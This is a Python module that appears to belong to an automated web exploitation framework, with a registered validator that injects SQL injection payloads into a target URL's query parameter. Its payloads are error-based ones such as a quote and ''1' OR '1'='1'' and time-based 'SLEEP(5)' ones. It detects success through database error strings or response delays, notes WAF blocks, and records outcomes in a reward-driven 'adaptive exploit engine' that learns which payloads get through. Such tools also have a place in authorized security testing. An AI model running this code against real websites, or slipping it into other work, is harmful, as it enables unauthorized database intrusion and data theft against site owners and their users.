import time, asyncio, aiohttp, re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.adaptive_exploit_engine import compute_reward, AdaptiveExploitEngine
from .registry import register
from core.local_payload_engine import suggest_payloads

TIME_PAYLOADS = [
    "' AND SLEEP(5)-- -",
    "\" AND SLEEP(5)-- -",
    "1) AND SLEEP(5)-- -",
]
ERROR_PAYLOADS = ["'", "1' OR '1'='1", "'))--"]
ERROR_PATTERNS = [
    r"sql", r"mysql", r"postgresql", r"oracle", r"sqlite",
    r"syntax error", r"unclosed quote",
    r"you have an error", r"exception"
]
THRESHOLD = 4.5

async def _timed(session, url):
    start = time.monotonic()
    try:
        async with session.get(url, timeout=20) as r:
            body = await r.text()
            status = r.status
    except Exception:
        return 999, 0, ""
    return time.monotonic() - start, status, body

@register("sqli")
async def validate_sqli(url: str, param: str) -> dict | None:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    _engine = AdaptiveExploitEngine()

    async with aiohttp.ClientSession() as s:
        # 1. Check Error-based SQLi
        suggested = suggest_payloads("sqli", n=20)
        for payload in list(dict.fromkeys(ERROR_PAYLOADS + [p for p in suggested if isinstance(p, str)])):
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            try:
                async with s.get(test_url, timeout=20) as r:
                    text = await r.text()
                    status1 = r.status
                    reward = compute_reward(
                        validated=False,
                        response_time=0.0,
                        baseline_time=0.0,
                        response_body=text,
                        baseline_body="",
                        status_code=status1,
                        waf_blocked="blocked" in text.lower() or "ray id" in text.lower(),
                        payload=payload,
                    )
                    if any(re.search(pattern, text, re.I) for pattern in ERROR_PATTERNS):
                        reward = 1.0
                        _engine.record_result(payload, "sqli", reward=reward, waf="unknown", tech=[])
                        return {
                            "validated": True,
                            "type": "Error-based SQLi",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": "SQL error pattern matched in response",
                        }
                    _engine.record_result(payload, "sqli", reward=reward, waf="unknown", tech=[])
            except Exception:
                pass

        # 2. Check Time-based SQLi
        qs[param] = ["1"]
        baseline_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        baseline, _, baseline_body = await _timed(s, baseline_url)

        for payload in TIME_PAYLOADS:
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            t, status1, body1 = await _timed(s, test_url)
            waf = "blocked" if "blocked" in body1.lower() or "ray id" in body1.lower() else "unknown"
            reward = compute_reward(
                validated=False,
                response_time=t,
                baseline_time=baseline,
                response_body=body1,
                baseline_body=baseline_body,
                status_code=status1,
                waf_blocked=waf == "blocked",
                payload=payload,
            )
            if t - baseline >= THRESHOLD:
                # Re-test to avoid network flukes
                t2, status2, body2 = await _timed(s, test_url)
                if t2 - baseline >= THRESHOLD:
                    reward = 1.0
                    _engine.record_result(payload, "sqli", reward=reward, waf=waf, tech=[])
                    return {
                        "validated": True,
                        "type": "Time-based SQLi",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Baseline={baseline:.2f}s, Injected={t2:.2f}s",
                    }
                reward = compute_reward(
                    validated=False,
                    response_time=t2,
                    baseline_time=baseline,
                    response_body=body2,
                    baseline_body=baseline_body,
                    status_code=status2,
                    waf_blocked="blocked" in body2.lower() or "ray id" in body2.lower(),
                    payload=payload,
                )
            _engine.record_result(payload, "sqli", reward=reward, waf=waf, tech=[])
    return None
